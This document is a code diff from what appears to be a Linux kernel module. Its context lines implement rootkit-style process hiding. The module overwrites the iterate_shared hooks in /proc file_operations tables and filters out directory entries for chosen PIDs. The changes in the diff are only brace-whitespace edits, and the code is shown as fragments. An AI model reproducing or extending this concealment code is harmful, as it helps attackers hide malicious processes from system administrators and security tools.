@@ -68,12 +68,12 @@ static DEFINE_SPINLOCK(syshook_lock);
 static atomic_t hook_active = ATOMIC_INIT(0);
 
 static int memd_iter_off(void)
-{
+ {
     return memd_net_gen() == MEMD_GEN_66 ? 56 : 64;
 }
 
 static unsigned long memd_iter_get(const struct file_operations *ops)
-{
+ {
     unsigned long v = 0;
     memd_safe_read64((void *)((const char *)ops + memd_iter_off()), &v);
     return v;
@@ -85,12 +85,12 @@ struct hide_ctx {
 };
 
 static bool should_hide_pid(pid_t pid, struct pid_namespace *ns)
-{
+ {
     return memd_hide_contains_ns(pid, ns);
 }
 
 static bool name_is_hidden_pid(const char *name, int namlen)
-{
+ {
     unsigned long v = 0;
     int i;
 
@@ -108,7 +108,7 @@ static hide_filldir_ret_t hide_filldir(struct dir_context *ctx,
                                          const char *name, int namlen,
                                          loff_t offset, u64 ino,
                                          unsigned int d_type)
-{
+ {
     struct hide_ctx *hc = container_of(ctx, struct hide_ctx, base);
     filldir_t orig_actor;
     hide_filldir_ret_t ret;
@@ -124,7 +124,7 @@ static hide_filldir_ret_t hide_filldir(struct dir_context *ctx,
 }
 
 static int memd_iterate_shared(struct file *filp, struct dir_context *ctx)
-{
+ {
     iterate_shared_fn orig;
     struct hide_ctx hc;
     int ret;
@@ -150,7 +150,7 @@ static int memd_iterate_shared(struct file *filp, struct dir_context *ctx)
 }
 
 static int hook_proc_dir(const char *path)
-{
+ {
     struct file *f;
     const struct file_operations *ops;
     iterate_shared_fn orig;
@@ -186,7 +186,7 @@ static int hook_proc_dir(const char *path)
 }
 
 static int install_hooks_on_fops(const struct file_operations *ops, iterate_shared_fn new_iter)
-{
+ {
     int wr;
 
     wr = memd_table_write64((unsigned long)ops + (unsigned long)memd_iter_off(),
@@ -208,7 +208,7 @@ static int install_hooks_on_fops(const struct file_operations *ops, iterate_shar
 }
 
 static int uninstall_hooks_from_fops(const struct file_operations *ops, iterate_shared_fn orig_iter)
-{
+ {
     int wr;
 
     wr = memd_table_write64((unsigned long)ops + (unsigned long)memd_iter_off(),
@@ -228,7 +228,7 @@ static int uninstall_hooks_from_fops(const struct file_operations *ops, iterate_
 }
 
 int memd_hide_install(void)
-{
+ {
     unsigned long flags;
     int ret = 0;
     int i;
@@ -281,7 +281,7 @@ fail:
 }
 
 int memd_hide_uninstall(void)
-{
+ {
     unsigned long flags;
     int ret = 0;
     int i;
@@ -308,6 +308,6 @@ int memd_hide_uninstall(void)
 }
 
 int memd_hide_active(void)
-{
+ {
     return atomic_read(&hook_active);
 }
